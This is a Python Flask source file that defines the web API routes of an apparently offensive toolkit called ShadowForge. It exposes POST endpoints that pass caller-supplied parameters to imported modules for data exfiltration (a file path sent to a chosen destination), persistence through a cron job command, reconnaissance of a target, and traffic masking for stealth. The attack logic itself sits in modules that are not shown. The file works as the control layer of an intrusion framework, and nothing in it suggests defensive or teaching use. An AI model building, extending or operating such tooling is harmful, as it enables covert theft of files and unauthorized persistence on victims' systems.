from flask import Blueprint, request, jsonify
from ShadowForge.modules.exfiltration_hub import exfiltration_hub
from ShadowForge.modules.persistence_builder import persistence_builder
from ShadowForge.modules.reconnaissance import reconnaissance
from ShadowForge.modules.stealth_toolkit import stealth_toolkit

execution_routes = Blueprint("execution_routes", __name__)

@execution_routes.route("/exfiltration", methods=["POST"])
def execute_exfiltration():
    data = request.json
    file_path = data.get("file_path")
    destination = data.get("destination")
    method = data.get("method", "http")
    result = exfiltration_hub.execute(file_path=file_path, destination=destination, method=method)
    return jsonify({"result": result})

@execution_routes.route("/persistence", methods=["POST"])
def execute_persistence():
    data = request.json
    method = data.get("method", "cronjob")
    cronjob_cmd = data.get("cronjob_cmd")
    interval = data.get("interval", "* * * * *")
    result = persistence_builder.execute(method=method, cronjob_cmd=cronjob_cmd, interval=interval)
    return jsonify({"result": result})

@execution_routes.route("/reconnaissance", methods=["POST"])
def execute_reconnaissance():
    data = request.json
    target = data.get("target")
    action = data.get("action", "dns")
    result = reconnaissance.execute(target=target, action=action)
    return jsonify({"result": result})

@execution_routes.route("/stealth", methods=["POST"])
def execute_stealth():
    data = request.json
    action = data.get("action", "mask_traffic")
    method = data.get("method", "randomize")
    result = stealth_toolkit.execute(action=action, method=method)
    return jsonify({"result": result})
